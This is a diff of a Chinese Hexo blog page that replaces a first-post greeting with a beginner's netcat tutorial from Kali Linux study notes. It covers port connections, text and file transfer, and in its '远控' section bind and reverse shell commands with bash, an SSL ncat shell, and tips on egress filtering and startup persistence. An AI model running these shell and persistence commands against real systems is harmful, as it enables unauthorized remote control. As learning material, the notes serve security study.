@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="分享," />
+  <meta name="keywords" content="nc 安全," />
 
 
 
@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="这是我的第一篇博客我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。">
-<meta name="keywords" content="分享">
+<meta name="description" content="nc的用法nc是渗透测试的瑞士军刀，大小只有100多K,但功能强大 端口服务基本命令1nc -nv ***.***.***.***(目标ip) 目标端口 eg. 1）ping出163服务器IP，pop3服务端口是110，stmp是25；    2）监听端口，输入USER 用户名 PASSWORD 密码    3)就可以进行正常邮件服务tips. pop3密码要用base64编码,kali下有直接的">
+<meta name="keywords" content="nc 安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="序">
-<meta property="og:url" content="https://newird.github.io/2018/09/22/序/index.html">
+<meta property="og:title" content="kali基础之nc">
+<meta property="og:url" content="https://newird.github.io/2018/09/22/nc/index.html">
 <meta property="og:site_name" content="各种笔记">
-<meta property="og:description" content="这是我的第一篇博客我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。">
+<meta property="og:description" content="nc的用法nc是渗透测试的瑞士军刀，大小只有100多K,但功能强大 端口服务基本命令1nc -nv ***.***.***.***(目标ip) 目标端口 eg. 1）ping出163服务器IP，pop3服务端口是110，stmp是25；    2）监听端口，输入USER 用户名 PASSWORD 密码    3)就可以进行正常邮件服务tips. pop3密码要用base64编码,kali下有直接的">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-22T14:39:35.571Z">
+<meta property="og:updated_time" content="2018-10-05T11:48:09.614Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="序">
-<meta name="twitter:description" content="这是我的第一篇博客我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。">
+<meta name="twitter:title" content="kali基础之nc">
+<meta name="twitter:description" content="nc的用法nc是渗透测试的瑞士军刀，大小只有100多K,但功能强大 端口服务基本命令1nc -nv ***.***.***.***(目标ip) 目标端口 eg. 1）ping出163服务器IP，pop3服务端口是110，stmp是25；    2）监听端口，输入USER 用户名 PASSWORD 密码    3)就可以进行正常邮件服务tips. pop3密码要用base64编码,kali下有直接的">
 
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://newird.github.io/2018/09/22/序/"/>
+  <link rel="canonical" href="https://newird.github.io/2018/09/22/nc/"/>
 
 
 
 
 
-  <title>序 | 各种笔记</title>
+  <title>kali基础之nc | 各种笔记</title>
   
 
 
@@ -265,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/序/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/nc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -282,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">序</h1>
+          <h1 class="post-title" itemprop="name headline">kali基础之nc</h1>
         
 
         <div class="post-meta">
@@ -317,8 +317,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/序/" itemprop="url" rel="index">
-                    <span itemprop="name">序</span>
+                  <a href="/categories/kali/" itemprop="url" rel="index">
+                    <span itemprop="name">kali</span>
                   </a>
                 </span>
 
@@ -354,7 +354,20 @@
       
 
       
-        <h1 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h1><h2 id="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"><a href="#我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。" class="headerlink" title="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"></a>我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。</h2><h2 id="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"><a href="#我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。" class="headerlink" title="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"></a>我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。</h2>
+        <h3 id="nc的用法"><a href="#nc的用法" class="headerlink" title="nc的用法"></a>nc的用法</h3><p>nc是渗透测试的瑞士军刀，大小只有100多K,但功能强大</p>
+<h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p>基本命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv ***.***.***.***(目标ip) 目标端口</span><br></pre></td></tr></table></figure></p>
+<p>eg. 1）ping出163服务器IP，pop3服务端口是110，stmp是25；<br>    2）监听端口，输入USER 用户名<cr> PASSWORD 密码<br>    3)就可以进行正常邮件服务<br>tips. pop3密码要用base64编码,kali下有直接的转换工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content</span><br><span class="line">&lt;C-D&gt;</span><br></pre></td></tr></table></figure></cr></p>
+<h2 id="传输文本"><a href="#传输文本" class="headerlink" title="传输文本"></a>传输文本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 开放端口</span><br><span class="line">B:nc -nv A的IP 开放端口</span><br></pre></td></tr></table></figure>
+<p>其中 -lp 为服务端 -nv为客户端<br>eg.电子取证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:ls -l(ps -autx)(lsof) |nc -nv B的IP 开放端口 </span><br><span class="line">B:nc -lp 开放端口&gt;receive.txt -q 1</span><br></pre></td></tr></table></figure></p>
+<p>这样在不破坏A的情况下,把A的情况保存到B的receive文件中<br>q 1 为完成后1秒退出</p>
+<h2 id="传输文件-类似ftp"><a href="#传输文件-类似ftp" class="headerlink" title="传输文件(类似ftp)"></a>传输文件(类似ftp)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 &gt; file(接收端)</span><br><span class="line">B:nc -nv A的IP 端口 &lt; file q 1</span><br></pre></td></tr></table></figure>
+<p>或者为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 &lt; file q 1</span><br><span class="line">B:nc -nv A的IP 端口 &gt; file(接收端)</span><br></pre></td></tr></table></figure></p>
+<h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>正向<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 -c bash (win 为cmd)</span><br><span class="line">B:nc -nv A的IP 端口(攻)</span><br></pre></td></tr></table></figure></p>
+<p>反向<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口(攻)</span><br><span class="line">B:nc -nv A的IP 端口 -c bash</span><br></pre></td></tr></table></figure></p>
+<p>tips.通常情况下服务器会限制进来的流量,所以攻击者开放端口,服务器端主动连接<br>不会限制的端口DNS 53等<br>可以把NC服务写在开机启动,这样漏洞修复也能连上(还不会写,以后补)<br>另外win下下载死活不能启动,安全管家还给我删了,太负责了</p>
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>通常情况下nc不能加密传输,要用ncat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:ncat -c bash --allow 允许IP(B攻击者) -vnl 端口 --ssl</span><br><span class="line">B:ncat -nv A的IP 端口 --ssl</span><br></pre></td></tr></table></figure></p>
+<p>我的kali上没有ncat工具,根据经验自创命令下载安装,成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ncat</span><br></pre></td></tr></table></figure></p>
+
       
     </div>
     
@@ -371,7 +384,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/分享/" rel="tag"># 分享</a>
+            <a href="/tags/nc-安全/" rel="tag"># nc 安全</a>
           
         </div>
       
@@ -384,15 +397,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/09/22/序/" rel="next" title="序">
+                <i class="fa fa-chevron-left"></i> 序
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/22/nc/" rel="prev" title="kali基础之nc">
-                kali基础之nc <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -564,7 +577,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#这是我的第一篇博客"><span class="nav-number">1.</span> <span class="nav-text">这是我的第一篇博客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"><span class="nav-number">1.1.</span> <span class="nav-text">我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"><span class="nav-number">1.2.</span> <span class="nav-text">我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nc的用法"><span class="nav-number">1.</span> <span class="nav-text">nc的用法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口服务"><span class="nav-number"></span> <span class="nav-text">端口服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传输文本"><span class="nav-number"></span> <span class="nav-text">传输文本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传输文件-类似ftp"><span class="nav-number"></span> <span class="nav-text">传输文件(类似ftp)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远控"><span class="nav-number"></span> <span class="nav-text">远控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加密"><span class="nav-number"></span> <span class="nav-text">加密</span></a></div>
             
 
           </div>
